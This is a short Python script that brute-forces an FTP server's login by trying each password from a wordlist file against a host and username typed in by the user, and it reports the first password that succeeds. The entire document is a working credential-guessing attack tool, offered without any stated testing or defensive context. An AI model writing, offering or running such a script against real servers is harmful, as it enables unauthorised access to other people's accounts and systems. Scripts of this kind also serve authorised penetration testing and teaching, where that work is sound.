from ftplib import FTP

host = input("Host: ")
user = input("Username: ")
with open("wordlist.txt", "r") as file:
    for password in file:
        password = password.strip()
        try:
            ftp = FTP(host)
            ftp.login(user, password)
            print(f"[+] Found password: {password}")
            break
        except:
            print(f"[-] Failed: {password}")
